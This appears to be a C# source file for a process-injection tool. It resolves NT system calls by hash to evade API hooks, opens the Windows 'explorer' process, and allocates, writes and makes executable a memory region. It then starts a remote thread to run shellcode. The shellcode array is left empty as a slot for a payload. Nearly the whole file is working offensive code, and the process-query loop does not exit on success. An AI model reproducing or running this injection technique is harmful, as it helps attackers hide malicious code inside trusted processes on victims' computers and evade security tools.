using DynamicSyscalls;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;

namespace ProcessInjection2
{
    internal class Program
    {
        static void Main(string[] args)
        {
            #region Init SysCalls
            var OpenProcess = DynamicInvoke.GetDelegate<Native.NtOpenProcess>("c03e64ea7a9cb82ea3f7e3eb68f5619b", true);
            var Close = DynamicInvoke.GetDelegate<Native.NtClose>("0136d251bb595c1d48a75d4cc27d71c8", true);
            var WriteVirtualMemory = DynamicInvoke.GetDelegate<Native.NtWriteVirtualMemory>("274e21507fce26a09c731cb2a89f6702", true);
            var AllocateVirtualMemory = DynamicInvoke.GetDelegate<Native.NtAllocateVirtualMemory>("445748b2bdab65055f58ca90ffd62c56", true);
            var ProtectVirtualMemory = DynamicInvoke.GetDelegate<Native.NtProtectVirtualMemory>("c09797ed8039245eacbc8afc05d71795", true);
            var QuerySystemInformation = DynamicInvoke.GetDelegate<Native.NtQuerySystemInformation>("1cc1ce6bdb6182d8cdc0c6de844f455b", true);
            var CreateThreadEx = DynamicInvoke.GetDelegate<Native.NtCreateThreadEx>("b96716a9b01f58fddc60984e1623dd56", true);
            #endregion

            #region SimpleProcessInjection
            byte[] shellcode = new byte[] { };
            SystemProcess targetProcess = GetProcessByName(QuerySystemInformation, "explorer")[0];

            OBJECT_ATTRIBUTES objattrib = new OBJECT_ATTRIBUTES();
            CLIENT_ID ProcessClientid = new CLIENT_ID
            {
                UniqueProcess = targetProcess.UniqueProcessId,
            };
            IntPtr hProcess = IntPtr.Zero;
            OpenProcess(ref hProcess, Native.VirtualMemoryWrite | Native.VirtualMemoryOperation | Native.CreateThread, ref objattrib, ref ProcessClientid);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("Cannot OpenProcess");
                return;
            }
            IntPtr hAllocated = IntPtr.Zero;
            int regionsize = shellcode.Length;
            AllocateVirtualMemory(hProcess, ref hAllocated, 0, ref regionsize, Native.MEM_COMMIT | Native.MEM_RESERVE, Native.ReadWrite);
            uint writtenbytes = 0;
            WriteVirtualMemory(hProcess, hAllocated, shellcode, regionsize, ref writtenbytes);
            ProtectVirtualMemory(hProcess, ref hAllocated, ref regionsize, Native.ExecuteRead, out _);
            IntPtr hThread = IntPtr.Zero;   
            CreateThreadEx(ref hThread,Native.THREAD_ALL_ACCESS , IntPtr.Zero , hProcess,hAllocated , IntPtr.Zero , false,0,0,0,IntPtr.Zero);
            if (hThread == IntPtr.Zero) 
            {
                Console.WriteLine("Cannot CreateThreadEx");
                return;
            }
            #endregion
            #region FreeMemory
            Close(hProcess);
            Close(hThread);
            DynamicInvoke.FreeMemory();
            #endregion 

        }
        //https://github.com/nettitude/hyperv-driver-thread-detection-poc/blob/4cb5cb542609a58d0e14849961eb51d5b2649d41/HyperVDriverThreadDetection/Program.cs
        static IEnumerable<SystemProcess> GetProcess(Native.NtQuerySystemInformation QuerySystemInformation)
        {
            List<SystemProcess> Processes = new List<SystemProcess>();
            uint bufferLength = 0;
            IntPtr buffer = IntPtr.Zero;
            // fuse pattern to prevent looping on endless NtQuerySystemInformation calls if it always returns ERROR_INSUFFICIENT_BUFFER
            const int BLOWN = 100;
            int fuse = 0;
            while (fuse++ != BLOWN)
            {
                // attempt to get process/thread information
                uint status = QuerySystemInformation(Native.SystemProcessInformation, buffer, bufferLength, out bufferLength);
                if (status == Native.STATUS_INFO_LENGTH_MISMATCH)
                {
                    // buffer wasn't big enough. reallocate and try again.
                    if (buffer != IntPtr.Zero)
                    {
                        Marshal.FreeHGlobal(buffer);
                    }
                    buffer = Marshal.AllocHGlobal((int)bufferLength);
                    continue;
                }
                else if (status != Native.STATUS_SUCCESS)
                {
                    // some other error occurred.
                    Console.WriteLine("[X] NtQuerySystemInformation call failed with status 0x{0:x}", status);
                }
            }

            try
            {
                uint offset = 0;

                while (true)
                {
                    var threads = new List<SYSTEM_THREAD_INFORMATION>();

                    var processInfo = Marshal.PtrToStructure<SYSTEM_PROCESS_INFORMATION>(IntPtr.Add(buffer, (int)offset));
                    uint nextProcessOffset = offset + processInfo.NextEntryOffset;
                    offset += ((uint)Marshal.SizeOf<SYSTEM_PROCESS_INFORMATION>());


                    for (int t = 0; t < processInfo.NumberOfThreads; t++)
                    {
                        var threadInfo = Marshal.PtrToStructure<SYSTEM_THREAD_INFORMATION>(IntPtr.Add(buffer, (int)offset));
                        offset += ((uint)Marshal.SizeOf<SYSTEM_THREAD_INFORMATION>());
                        threads.Add(threadInfo);
                    }


                    Processes.Add(new SystemProcess()
                    {
                        ImageName = processInfo.ImageName,
                        UniqueProcessId = processInfo.UniqueProcessId,
                        NumberOfThreads = processInfo.NumberOfThreads,
                        Threads = threads
                    }); ;

                    if (processInfo.NextEntryOffset == 0)
                    {
                        break;
                    }
                    offset = nextProcessOffset;

                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return Processes;
        }

        static SystemProcess[] GetProcessByName(Native.NtQuerySystemInformation QuerySystemInformation, string processname)
        {

            return GetProcess(QuerySystemInformation).Where(x =>
            {
                if (x.ImageName.Buffer == null)
                {
                    return false;
                }
                return x.ImageName.Buffer.IndexOf(processname) >= 0;
            }).ToArray();
        }
    }
}
